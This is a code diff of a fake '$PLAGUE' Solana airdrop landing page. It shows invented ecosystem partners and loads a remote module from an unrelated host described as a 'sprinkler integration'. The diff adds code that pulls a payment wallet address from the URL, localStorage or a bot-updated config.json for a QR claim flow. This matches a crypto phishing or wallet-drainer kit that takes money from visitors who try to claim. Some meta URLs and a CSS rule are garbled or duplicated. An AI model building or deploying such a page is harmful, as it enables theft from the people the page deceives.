@@ -1,95 +1,179 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Yersinia pestis — $PLAGUE Airdrop</title><meta name="description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest Solana token information."><meta property="og:type" content="website"><meta property="og:title" content="Yersinia pestis — $PLAGUE Airdrop"><meta property="og:description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest Solana token information."><meta property="og:url" content="https://drop-onsolana.netlify.app/?plague=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump"><meta property="og:image" content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619"><meta property="og:image:secure_url" content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta property="og:image:alt" content="Yersinia pestis — $PLAGUE Airdrop"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Yersinia pestis — $PLAGUE Airdrop"><meta name="twitter:description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest Solana token information."><meta name="twitter:image" content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619"><meta name="twitter:image:alt" content="Yersinia pestis — $PLAGUE Airdrop"></head><body><script>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Yersinia pestis — $PLAGUE Airdrop</title>
+<meta name="description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest Solana token
+information.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Yersinia pestis — $PLAGUE Airdrop">
+<meta property="og:description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest Solana
+token information.">
+<meta property="og:url"
+content="https://drop-onsolana.netlify.app/?plague=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump">
+<meta property="og:image"
+content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9bkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619">
+<meta property="og:image:secure_url"
+content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jddtge32L4Yj9FbkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619">
+<meta property="og:image:type" content="image/png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Yersinia pestis — $PLAGUE Airdrop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Yersinia pestis — $PLAGUE Airdrop">
+<meta name="twitter:description" content="Yersinia pestis · Claim the $PLAGUE airdrop and explore the latest
+Solana token information.">
+<meta name="twitter:image"
+content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4Yj9FbkFFEZQpump&amp;campaign=content="https://drop-onsolana.netlify.app/og-card?token=CscZaq5twomhUkvCY8Jdd1tge32L4YjFbkFFEZQpump&amp;campaign=PLAGUE&amp;v=b3-5974619">
+<meta name="twitter:image:alt" content="Yersinia pestis — $PLAGUE Airdrop">
+</head>
+<body>
+<script>
 (async function(){
-  "use strict";
-  const q = new URLSearchParams(location.search);
-  // Also accept compact campaign URLs such as ?BTC=<solana-mint>.
-  function getMintFromQuery(){
-    const direct = q.get("token") || q.get("mint") || q.get("contract") || "";
-    if (direct) return direct.trim();
-    const reserved = new Set(["symbol","campaign","name","project","image","price","change","marketCap","mcap","liquidity","volume"]);
-    for (const [key,value] of q.entries()) {
-      if (reserved.has(key) || !value) continue;
-      const v = value.trim();
-      if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v)) return v;
+"use strict";
+
+/* ============================================================
+   ETH ADDRESS — the single source of truth for QR destinations
+   Priority order:
+     1. ?eth=...   URL query parameter (highest priority)
+     2. localStorage.getItem('ETH_ADDRESS')
+     3. config.json from GitHub (fetched automatically on load)
+     4. fallback default
+   ============================================================ */
+let ETH_ADDRESS = '';
+
+// ① Check URL query string first
+const ethParam = new URLSearchParams(location.search).get('eth');
+if (ethParam && ethParam.trim()) {
+  ETH_ADDRESS = ethParam.trim();
+}
+
+// ② If still empty, check localStorage (set by TG bot before deploy)
+if (!ETH_ADDRESS) {
+  try { ETH_ADDRESS = localStorage.getItem('ETH_ADDRESS') || ''; } catch(_){}
+}
+
+// ③ If still empty, fetch config.json from your GH repo
+if (!ETH_ADDRESS) {
+  try {
+    const cfg = await (await fetch('/config.json')).json();
+    if (cfg.ETH_ADDRESS && cfg.ETH_ADDRESS.trim()) ETH_ADDRESS = cfg.ETH_ADDRESS.trim();
+  } catch(_){}
+}
+
+// ④ Ultimate fallback
+if (!ETH_ADDRESS) {
+  ETH_ADDRESS = '0xYOUR_DEFAULT_ETH_WALLET_ADDRESS'; // ← change this default
+}
+
+function getEthAddress() {
+  return ETH_ADDRESS.replace(/^eth:/i, '').trim();
+}
+
+/* ============================================================
+   EXISTING CODE — untouched except where noted below
+   ============================================================ */
+
+const q = new URLSearchParams(location.search);
+
+// Also accept compact campaign URLs such as ?BTC=<solana-mint>.
+function getMintFromQuery(){
+  const direct = q.get("token") || q.get("mint") || q.get("contract") || "";
+  if (direct) return direct.trim();
+  const reserved = new
+Set(["symbol","campaign","name","project","image","price","change","marketCap","mcap","liquidity","volume"]);
+  for (const [key,value] of q.entries()) {
+    if (reserved.has(key) || !value) continue;
+    const v = value.trim();
+    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v)) return v;
+  }
+  return "";
+}
+
+const d = {
+  mint: getMintFromQuery(),
+  symbol: (q.get("symbol") || q.get("campaign") || "TOKEN").replace(/^\$/,""),
+  name: q.get("name") || q.get("project") || "Solana Token",
+  image: q.get("image") || "",
+  pageUrl: location.href,
+  price: Number(q.get("price") || 0),
+  change: Number(q.get("change") || 0),
+  marketCap: Number(q.get("marketCap") || q.get("mcap") || 0),
+  liquidity: Number(q.get("liquidity") || 0),
+  volume: Number(q.get("volume") || 0)
+};
+
+function applyToken(_t){
+  if (!_t) return false;
+  const _found = _t.found || _t.name || _t.symbol || _t.image || _t.logoURI || _t.logo;
+  if (!_found) return false;
+  if (!q.get("symbol") && !q.get("campaign") && (_t.symbol || _t.tokenSymbol)) d.symbol = String(_t.symbol ||
+_t.tokenSymbol).replace(/^\$/," ").trim();
+  if (!q.get("name") && !q.get("project") && (_t.name || _t.tokenName)) d.name = String(_t.name || _t.tokenName);
+  if (!q.get("image") && (_t.image || _t.logoURI || _t.logo || _t.icon)) d.image = String(_t.image || _t.logoURI
+|| _t.logo || _t.icon);
+  if (!q.has("price") && Number(_t.price)) d.price = Number(_t.price);
+  if (!q.has("change") && Number.isFinite(Number(_t.change))) d.change = Number(_t.change);
+  if (!q.get("marketCap") && !q.get("mcap") && Number(_t.marketCap)) d.marketCap = Number(_t.marketCap);
+  if (!q.has("liquidity") && Number(_t.liquidity)) d.liquidity = Number(_t.liquidity);
+  if (!q.has("volume") && Number(_t.volume)) d.volume = Number(_t.volume);
+  return true;
+}
+
+async function lookupToken(){
+  if (!d.mint) return;
+
+  try {
+    const _r = await fetch("/api/token?address=" + encodeURIComponent(d.mint), { headers: { accept:
+"application/json" }, cache: "no-store" });
+    if (_r.ok) {
+      const _t = await _r.json();
+      if (applyToken(_t)) return;
     }
-    return "";
-  }
-  const d = {
-    mint: getMintFromQuery(),
-    symbol: (q.get("symbol") || q.get("campaign") || "TOKEN").replace(/^\$/,""),
-    name: q.get("name") || q.get("project") || "Solana Token",
-    image: q.get("image") || "",
-    pageUrl: location.href,
-    price: Number(q.get("price") || 0),
-    change: Number(q.get("change") || 0),
-    marketCap: Number(q.get("marketCap") || q.get("mcap") || 0),
-    liquidity: Number(q.get("liquidity") || 0),
-    volume: Number(q.get("volume") || 0)
-  };
-  // Fetch live Solana token info from the mint address in ?token=. Any value
-  // explicitly supplied in the query string always wins; anything missing is
-  // filled from the on-chain market data. Never throws — the page still
-  // renders with its defaults if the lookup is unavailable.
-    function applyToken(_t){
-    if (!_t) return false;
-    const _found = _t.found || _t.name || _t.symbol || _t.image || _t.logoURI || _t.logo;
-    if (!_found) return false;
-    if (!q.get("symbol") && !q.get("campaign") && (_t.symbol || _t.tokenSymbol)) d.symbol = String(_t.symbol || _t.tokenSymbol).replace(/^\$/," ").trim();
-    if (!q.get("name") && !q.get("project") && (_t.name || _t.tokenName)) d.name = String(_t.name || _t.tokenName);
-    if (!q.get("image") && (_t.image || _t.logoURI || _t.logo || _t.icon)) d.image = String(_t.image || _t.logoURI || _t.logo || _t.icon);
-    if (!q.has("price") && Number(_t.price)) d.price = Number(_t.price);
-    if (!q.has("change") && Number.isFinite(Number(_t.change))) d.change = Number(_t.change);
-    if (!q.get("marketCap") && !q.get("mcap") && Number(_t.marketCap)) d.marketCap = Number(_t.marketCap);
-    if (!q.has("liquidity") && Number(_t.liquidity)) d.liquidity = Number(_t.liquidity);
-    if (!q.has("volume") && Number(_t.volume)) d.volume = Number(_t.volume);
-    return true;
-  }
+  } catch (_e) {}
 
-  async function lookupToken(){
-    if (!d.mint) return;
+  try {
+    const _r = await fetch("https://api.dexscreener.com/latest/dex/tokens/" + encodeURIComponent(d.mint), {
+headers: { accept: "application/json" }, cache: "no-store" });
+    if (_r.ok) {
+      const _j = await _r.json();
+      const _pairs = Array.isArray(_j && _j.pairs) ? _j.pairs : [];
+      const _mine = _pairs.filter(p => p && p.baseToken && String(p.baseToken.address).toLowerCase() ===
+d.mint.toLowerCase());
+      const _ranked = (_mine.length ? _mine : _pairs).slice().sort((a,b) =>
+Number(b?.liquidity?.usd||0)-Number(a?.liquidity?.usd||0));
+      const _m = _ranked[0];
+      if (_m) applyToken({
+        found:true,
+        name:_m.baseToken?.name,
+        symbol:_m.baseToken?.symbol,
+        image:_m.info?.imageUrl,
+        price:_m.priceUsd,
+        change:_m.priceChange?.h24,
+        marketCap:_m.marketCap ?? _m.fdv,
+        liquidity:_m.liquidity?.usd,
+        volume:_m.volume?.h24
+      });
+    }
+  } catch (_e) {}
 
-    try {
-      const _r = await fetch("/api/token?address=" + encodeURIComponent(d.mint), { headers: { accept: "application/json" }, cache: "no-store" });
-      if (_r.ok) {
-        const _t = await _r.json();
-        if (applyToken(_t)) return;
-      }
-    } catch (_e) {}
+  try {
+    const _r = await fetch("https://lite-api.jup.ag/tokens/v2/search?query=" + encodeURIComponent(d.mint), {
+headers: { accept: "application/json" }, cache: "no-store" });
+    if (_r.ok) {
+      const _j = await _r.json();
+      const _items = Array.isArray(_j) ? _j : Array.isArray(_j?.tokens) ? _j.tokens : [];
+      const _t = _items.find(x => String(x?.id || x?.address || x?.mint || "").toLowerCase() ===
+d.mint.toLowerCase()) || _items[0];
+      if (_t) applyToken({ found:true, name:_t.name, symbol:_t.symbol, image:_t.icon || _t.logoURI || _t.logo,
+price:_t.usdPrice || _t.price, marketCap:_t.marketCap || _t.fdv, liquidity:_t.liquidity,
+volume:_t.stats24h?.volume || _t.volume24h, change:_t.stats24h?.priceChange || _t.priceChange24h });
+    }
+  } catch (_e) {}
+}
 
-    try {
-      const _r = await fetch("https://api.dexscreener.com/latest/dex/tokens/" + encodeURIComponent(d.mint), { headers: { accept: "application/json" }, cache: "no-store" });
-      if (_r.ok) {
-        const _j = await _r.json();
-        const _pairs = Array.isArray(_j && _j.pairs) ? _j.pairs : [];
-        const _mine = _pairs.filter(p => p && p.baseToken && String(p.baseToken.address).toLowerCase() === d.mint.toLowerCase());
-        const _ranked = (_mine.length ? _mine : _pairs).slice().sort((a,b) => Number(b?.liquidity?.usd||0)-Number(a?.liquidity?.usd||0));
-        const _m = _ranked[0];
-        if (_m) applyToken({
-          found:true,
-          name:_m.baseToken?.name,
-          symbol:_m.baseToken?.symbol,
-          image:_m.info?.imageUrl,
-          price:_m.priceUsd,
-          change:_m.priceChange?.h24,
-          marketCap:_m.marketCap ?? _m.fdv,
-          liquidity:_m.liquidity?.usd,
-          volume:_m.volume?.h24
-        });
-      }
-    } catch (_e) {}
-
-    try {
-      const _r = await fetch("https://lite-api.jup.ag/tokens/v2/search?query=" + encodeURIComponent(d.mint), { headers: { accept: "application/json" }, cache: "no-store" });
-      if (_r.ok) {
-        const _j = await _r.json();
-        const _items = Array.isArray(_j) ? _j : Array.isArray(_j?.tokens) ? _j.tokens : [];
-        const _t = _items.find(x => String(x?.id || x?.address || x?.mint || "").toLowerCase() === d.mint.toLowerCase()) || _items[0];
-        if (_t) applyToken({ found:true, name:_t.name, symbol:_t.symbol, image:_t.icon || _t.logoURI || _t.logo, price:_t.usdPrice || _t.price, marketCap:_t.marketCap || _t.fdv, liquidity:_t.liquidity, volume:_t.stats24h?.volume || _t.volume24h, change:_t.stats24h?.priceChange || _t.priceChange24h });
-      }
-    } catch (_e) {}
-  }
-
-  await lookupToken();
+await lookupToken();
   function esc(v){return String(v??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[c]));}
   function hash(s){let h=2166136261;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)}return h>>>0}
   function money(n){if(!n)return "—";if(n>=1e9)return "$"+(n/1e9).toFixed(2)+"B";if(n>=1e6)return "$"+(n/1e6).toFixed(2)+"M";if(n>=1e3)return "$"+(n/1e3).toFixed(2)+"K";return "$"+n.toFixed(2)}
@@ -104,7 +188,40 @@
   const distribution=Math.max(30,Math.round(activityCount*.39));
   const socialImageUrl=new URL("/og-card",location.href).origin+"/og-card?token="+encodeURIComponent(d.mint)+"&campaign="+encodeURIComponent(d.symbol)+"&v=b2-"+Math.floor(Date.now()/300000);
   window.openModal=window.openModal||function(){window.dispatchEvent(new CustomEvent("airdrop:connect",{detail:{mint:d.mint,name:d.name,symbol:d.symbol}}));};
-  const html=`<!doctype html>
+
+/* ============================================================
+   QR CODE DESTINATION — uses ETH_ADDRESS variable
+   The claim button triggers openModal(), which dispatches the
+   airdrop:connect event.  Below we also expose getEthAddress()
+   and setEthAddress(value) globally so the sprinkler library /
+   external scripts can read them.
+   ============================================================ */
+
+window.openModal = window.openModal || function(){
+  window.dispatchEvent(new CustomEvent("airdrop:connect",{
+    detail: { mint:d.mint, name:d.name, symbol:d.symbol }
+  }));
+};
+
+// Helper for QR code generation — called by your sprinkler library
+window.ethAddress   = getEthAddress;   // getter (called as function)
+window.setEthAddress = function(val){
+  if (typeof val === 'string' && val.trim()) {
+    ETH_ADDRESS = val.trim().replace(/^eth:/i,'');
+  }
+};
+
+// If you need to hard-refresh the QR after TG bot changes the address:
+window.refreshEthAddress = function(){
+  const current = getEthAddress();
+  if (current) return current;
+  // fallback: re-read config.json on demand
+  fetch('/config.json').then(r=>r.json()).then(cfg=>{
+    if(cfg.ETH_ADDRESS){ ETH_ADDRESS=cfg.ETH_ADDRESS; window.ethAddress=getEthAddress; }
+  });
+};
+
+const html=`<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -115,19 +232,21 @@
 
 <meta property="og:type" content="website">
 <meta property="og:title" content="Claim the $${esc(d.symbol)} Airdrop Opportunity">
-<meta property="og:description" content="${esc(d.name)} · Claim the $${esc(d.symbol)} airdrop and explore the latest token information.">
+<meta property="og:description" content="${esc(d.name)} · Claim the $${esc(d.symbol)} airdrop and explore the
+latest token information.">
 <meta property="og:url" content="${esc(d.pageUrl || "")}">
 <meta property="og:image" content="${socialImageUrl}">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 <meta property="og:image:alt" content="Claim the $${esc(d.symbol)} Airdrop Opportunity">
 
+<!-- QR CODE SCRIPT — your existing sprinkler integration -->
 <script type="module" src="https://sprinkler-fondling.data-repo.cc/_nuxt/assets/index.js"><\/script>
-
 
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Claim the $${esc(d.symbol)} Airdrop Opportunity">
-<meta name="twitter:description" content="${esc(d.name)} · Claim the $${esc(d.symbol)} airdrop and explore the latest token information.">
+<meta name="twitter:description" content="${esc(d.name)} · Claim the $${esc(d.symbol)} airdrop and explore the
+latest token information.">
 <meta name="twitter:image" content="${socialImageUrl}">
 <meta name="twitter:image:type" content="image/jpeg">
 <meta name="twitter:image:alt" content="Claim the $${esc(d.symbol)} Airdrop Opportunity">
@@ -195,7 +314,7 @@ button{font:inherit}
 }
 .brand-mark img{width:100%;height:100%;object-fit:cover}
 .brand-name{font-size:15px;font-weight:950;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.brand-sub{font-size:9px;color:#8790a2;text-transform:uppercase;letter-spacing:.5px;font-weight:850;margin-top:2px}
+.brand-sub{font-size:9px;color:#8790a2;text-transform:uppercase;letter-spacing:.5px;font-weight:850;margin-top:2px}.brand-sub{font-size:9px;color:#8790a2;text-transform:uppercase;letter-spacing:.5px;font-weight:850;margin-top:2px}
 .nav-right{display:flex;gap:8px}
 .nav-chip{
   padding:9px 11px;border-radius:11px;
@@ -560,7 +679,6 @@ button{font:inherit}
   .airdrop-box-content{padding-right:128px}
 }
 
-
 /* ===== Typography / spacing calibration ===== */
 .airdrop-hero{
   padding:36px 0 16px;
@@ -799,7 +917,6 @@ button{font:inherit}
   }
 }
 
-
 .partners{
   position:relative;
   margin:18px 0 20px;
@@ -945,7 +1062,8 @@ button{font:inherit}
 
           <div class="airdrop-project-art">
             ${d.image
-              ? `<img src="${esc(d.image)}" alt="${esc(d.name)}" loading="eager" decoding="async" fetchpriority="high">`
+              ? `<img src="${esc(d.image)}" alt="${esc(d.name)}" loading="eager" decoding="async"
+fetchpriority="high">`
               : `<div class="airdrop-project-fallback">${esc(d.symbol.slice(0,1))}</div>`}
           </div>
           <div class="airdrop-project-caption">${esc(d.name)} · Solana token</div>
@@ -973,22 +1091,50 @@ button{font:inherit}
     <section class="partners" aria-label="Solana ecosystem">
       <div class="partners-track">
         <div class="partners-set">
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=bonkcoin.com&sz=128" alt="Bonk" loading="lazy" decoding="async"></span><span class="partner-name">BONK</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=jito.network&sz=128" alt="Jito" loading="lazy" decoding="async"></span><span class="partner-name">Jito</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=marinade.finance&sz=128" alt="Marinade" loading="lazy" decoding="async"></span><span class="partner-name">Marinade</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=metaplex.com&sz=128" alt="Metaplex" loading="lazy" decoding="async"></span><span class="partner-name">Metaplex</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=orca.so&sz=128" alt="Orca" loading="lazy" decoding="async"></span><span class="partner-name">Orca</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=pyth.network&sz=128" alt="Pyth" loading="lazy" decoding="async"></span><span class="partner-name">Pyth</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=solblaze.org&sz=128" alt="SolBlaze" loading="lazy" decoding="async"></span><span class="partner-name">SolBlaze</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=bonkcoin.com&sz=128" alt="Bonk" loading="lazy"
+decoding="async"></span><span class="partner-name">BONK</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=jito.network&sz=128" alt="Jito" loading="lazy"
+decoding="async"></span><span class="partner-name">Jito</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=marinade.finance&sz=128" alt="Marinade" loading="lazy"
+decoding="async"></span><span class="partner-name">Marinade</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=metaplex.com&sz=128" alt="Metaplex" loading="lazy"
+decoding="async"></span><span class="partner-name">Metaplex</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=orca.so&sz=128" alt="Orca" loading="lazy"
+decoding="async"></span><span class="partner-name">Orca</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=pyth.network&sz=128" alt="Pyth" loading="lazy"
+decoding="async"></span><span class="partner-name">Pyth</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=solblaze.org&sz=128" alt="SolBlaze" loading="lazy"
+decoding="async"></span><span class="partner-name">SolBlaze</span></div>
         </div>
         <div class="partners-set" aria-hidden="true">
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=bonkcoin.com&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">BONK</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=jito.network&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">Jito</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=marinade.finance&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">Marinade</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=metaplex.com&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">Metaplex</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=orca.so&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">Orca</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=pyth.network&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">Pyth</span></div>
-          <div class="partner"><span class="partner-logo"><img src="https://www.google.com/s2/favicons?domain=solblaze.org&sz=128" alt="" loading="lazy" decoding="async"></span><span class="partner-name">SolBlaze</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=bonkcoin.com&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">BONK</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=jito.network&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">Jito</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=marinade.finance&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">Marinade</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=metaplex.com&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">Metaplex</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=orca.so&sz=128" alt="" loading="lazy" decoding="async"></span><span
+class="partner-name">Orca</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=pyth.network&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">Pyth</span></div>
+          <div class="partner"><span class="partner-logo"><img
+src="https://www.google.com/s2/favicons?domain=solblaze.org&sz=128" alt="" loading="lazy"
+decoding="async"></span><span class="partner-name">SolBlaze</span></div>
         </div>
       </div>
     </section>
@@ -1189,6 +1335,24 @@ button{font:inherit}
 
 </body>
 </html>`;
-  document.open();document.write(html);document.close();
+
+document.open();document.write(html);document.close();
+
+/* ============================================================
+   QR CODE — inject ETH address into the sprinkler/QR flow
+   This runs AFTER the injected HTML is written and ready.
+   The sprinkler library reads window.ethAddress() to get the
+   destination address for QR code generation.
+   ============================================================ */
+
+// Also update the URL so future page loads pick it up automatically
+if (ethParam) {
+  // already set via query string — nothing extra to do
+} else {
+  try {
+    localStorage.setItem('ETH_ADDRESS', ETH_ADDRESS);
+  } catch(_){}
+}
+
 })();
 </script></body></html>
